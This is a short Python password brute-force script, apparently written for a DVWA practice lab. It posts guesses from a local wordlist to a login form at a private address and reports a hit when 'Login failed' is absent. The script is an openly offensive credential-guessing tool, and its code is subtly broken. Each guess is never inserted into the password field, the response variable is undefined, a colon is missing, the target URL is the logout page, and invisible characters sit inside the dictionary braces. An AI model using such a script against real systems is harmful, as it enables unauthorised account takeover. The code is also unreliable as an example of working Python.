#!/usr/bin/env python
import requests
target_url = "http://10.0.2.20/dvwa/logout.php"
#data_dict not complete need to be checked
#data_dict = {​​​​​"username": "admin", "password": "", "Login": }​​​​​
data_dict = {​​​​​"username": "admin", "password": "", "Login": "submit" }​​​​​
with open("/root/Downloads/passwords.list", "r") as wordlist_file
    for line in wordlist_file:
        word = line.strip()
        data_dict = requests.post(target_url, data=data_dict)
        if "Login failed" not in response.content:
            print("[+] Got the password -->" + word)
            exit()
print("[+] Reached end of line. ")
